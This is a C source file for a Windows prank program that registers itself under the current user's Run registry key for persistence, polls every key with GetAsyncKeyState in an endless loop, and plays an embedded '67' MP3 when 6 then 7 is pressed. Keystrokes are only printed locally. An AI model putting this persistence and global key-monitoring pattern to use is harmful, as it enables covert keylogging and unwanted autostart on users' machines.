#include <stdio.h>
#include <Windows.h>
#define MINIAUDIO_IMPLEMENTATION
#include "miniaudio.h" //https://github.com/mackron/miniaudio real hero right here !
#include "67.h"

//6	0x36	6 key
//7	0x37	7 key



static BOOL SetRegistryValue(IN HKEY hRootKey, IN LPCWSTR pszSubKey, IN LPCWSTR pszValueName, IN LPCWSTR pszData)
{
	HKEY hKey = NULL;
	DWORD dwDataLength = 0x00;
	LSTATUS STATUS = ERROR_SUCCESS;

	if(!pszData || !pszSubKey || !pszValueName)
		return FALSE;

	// (x+1) * 2
	dwDataLength = (lstrlenW(pszData) + 1) * sizeof(WCHAR);
	printf("Data length byte is: %lu\n", dwDataLength);

	// creates kety 
	// REG_OPTION_NOW_VOLATILE to survive reboot
	STATUS = RegCreateKeyExW(
		hRootKey,
		pszSubKey,
		0,
		0,
		REG_OPTION_NON_VOLATILE,
		KEY_SET_VALUE,
		NULL, 
		&hKey,
		NULL
	);

	if(STATUS != ERROR_SUCCESS){
		printf("status failed reg create key function is not working: %lu\n:", STATUS);
		goto _END_OF_FUNC;
	}

	//write to key
	STATUS = RegSetValueExW(
		hKey,
		pszValueName,
		0,
		REG_SZ,
		(PBYTE)pszData,
		dwDataLength
	);

	if(STATUS != ERROR_SUCCESS){
		printf("status failed res set value fucntion is not working: %lu\n", STATUS);
		goto _END_OF_FUNC;
	}
_END_OF_FUNC:
	if (hKey) RegCloseKey(hKey);
	return (STATUS == ERROR_SUCCESS) ? TRUE : FALSE;
}

static BOOL startPersistence(VOID){
	WCHAR wszExePath[MAX_PATH] = {0};

	//find pe

	DWORD dwLen = GetModuleFileNameW(NULL, wszExePath, MAX_PATH);

	if(dwLen == 0){
		printf("error at get module file name : %lu\n", GetLastError());
		return FALSE;
	}


	printf("PE path: %ls\n", wszExePath);

	return SetRegistryValue(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"SixSeven", wszExePath);
}

void play_67(void){
	ma_engine engine;
	ma_result result;

	result = ma_engine_init(NULL, &engine);
	if(result != MA_SUCCESS){
		printf("we f'ed up \n");
		return;
	}

	printf("ma engine workign \n");

	//decoder
	ma_decoder decoder;
	if(ma_decoder_init_memory(__67_SQlv2Xv_mp3, __67_SQlv2Xv_mp3_len, NULL, &decoder) != MA_SUCCESS){
		printf("failed to decode \n");
		ma_engine_uninit(&engine);
		return;
	}

	printf("ma decoder working \n");
	
	ma_sound sound;
	ma_sound_init_from_data_source(&engine, &decoder, 0, NULL, &sound);
	ma_sound_start(&sound);
	
	while(ma_sound_is_playing(&sound)){
		ma_sleep(100);
	}

	ma_sound_uninit(&sound);
	ma_decoder_uninit(&decoder);
	ma_engine_uninit(&engine);

	printf("sound init working \n");
	
}

int main()
{

	//persistence start 
startPersistence();
printf (" Persistence has started \n");
static int lastKey = 0;

    do
    {
        for (INT vKey = 8; vKey < 256; vKey++)
        {
// lsb for released 
            if (GetAsyncKeyState(vKey) & 0x01)
            {
                printf("Key Pressed:\n"
                       " - Virtual Key: 0x%x\n"
                       " - Scan Code : 0x%x\n",
                       vKey, MapVirtualKeyW(vKey, MAPVK_VK_TO_VSC));

				if (lastKey == '6' && vKey == '7'){
					printf("found 67\n");
					play_67();
				}

				lastKey = vKey;
            }

            Sleep(1);
        }   
    } while (TRUE);   

    return 0;
}   
	
	/*bool bIsSixPressed = false;
	

	if (GetAsyncKeyState('6') & 0x36){
		bIsSixPressed = true;
		printf("6 is pressed ....\n");
		sleep(200);
		}

	if (GetAsyncKeyState('7') & 0x37){
		printf("7 is pressed ....\n");
		bIsSixPressed = false;
		sleep(200);
		}

	for (int virtualKey = 1; virtual
			


		
	}*/


